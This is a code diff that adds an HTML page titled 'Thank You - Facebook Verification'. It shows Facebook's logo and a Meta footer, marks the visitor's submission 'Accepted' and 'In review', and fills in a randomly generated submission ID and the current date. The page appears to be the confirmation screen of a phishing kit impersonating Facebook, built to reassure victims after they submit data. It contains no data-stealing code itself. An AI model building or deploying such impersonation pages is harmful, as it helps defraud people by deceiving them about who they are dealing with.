@@ -1,0 +1,56 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Thank You - Facebook Verification</title>
+    <link href="style.css" rel="stylesheet" type="text/css" />
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+</head>
+<body>
+    <nav>
+        <div class="nav-left">
+            <div class="fb-logo">
+                <img src="IMG-20241211-WA0029.jpg" alt="Facebook">
+            </div>
+        </div>
+    </nav>
+    <main class="thank-you-page">
+        <div class="submission-container">
+            <div class="submission-header">
+                <div class="submission-id">Submission ID: <span id="submissionId"></span></div>
+                <h1 class="status">Accepted</h1>
+            </div>
+            <div class="timeline">
+                <div class="timeline-item completed">
+                    <i class="fas fa-check-circle"></i>
+                    <div class="timeline-content">
+                        <h3>Submission received</h3>
+                        <p>Your submission was received on <span id="submissionDate"></span></p>
+                    </div>
+                </div>
+                <div class="timeline-item in-review">
+                    <i class="fas fa-clock"></i>
+                    <div class="timeline-content">
+                        <h3>In review</h3>
+                        <p>We've received your submission</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+    <footer>
+        <p>Meta . 2025 © </p>
+    </footer>
+    <script>
+        // Generate random submission ID
+        document.getElementById('submissionId').textContent = Math.floor(Math.random() * 9000000000000000) + 1000000000000000;
+        
+        // Set current date
+        const date = new Date();
+        const options = { day: 'numeric', month: 'short' };
+        document.getElementById('submissionDate').textContent = date.toLocaleDateString('en-GB', options);
+    </script>
+</body>
+</html>
